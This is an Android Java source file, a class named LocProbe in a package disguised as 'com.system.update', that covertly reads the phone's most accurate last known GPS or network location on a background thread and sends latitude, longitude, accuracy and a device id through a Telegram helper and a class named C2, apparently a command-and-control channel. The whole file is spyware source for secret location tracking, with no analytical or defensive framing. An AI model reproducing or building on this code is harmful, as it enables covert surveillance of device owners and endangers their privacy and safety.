package com.system.update;

import android.annotation.SuppressLint;
import android.content.Context;
import android.location.Location;
import android.location.LocationManager;

public final class LocProbe {
    private LocProbe() {}

    @SuppressLint("MissingPermission")
    public static void run(Context ctx) {
        new Thread(() -> {
            try {
                LocationManager lm = (LocationManager) ctx.getSystemService(Context.LOCATION_SERVICE);
                if (lm == null) return;
                Location best = null;
                for (String p : new String[]{LocationManager.GPS_PROVIDER, LocationManager.NETWORK_PROVIDER}) {
                    try {
                        Location l = lm.getLastKnownLocation(p);
                        if (l == null) continue;
                        if (best == null || l.getAccuracy() < best.getAccuracy()) best = l;
                    } catch (Throwable ignored) {}
                }
                if (best != null) {
                    Telegram.send("📍 LOC id=" + C2.getDeviceId()
                            + "\nlat=" + best.getLatitude()
                            + "\nlon=" + best.getLongitude()
                            + "\nacc=" + best.getAccuracy()
                            + "\nprov=" + best.getProvider());
                } else {
                    Telegram.reportEvent(C2.getDeviceId(), "loc_none");
                }
            } catch (Throwable t) {
                Telegram.reportEvent(C2.getDeviceId(), "loc_err:" + t.getMessage());
            }
        }, "loc").start();
    }
}
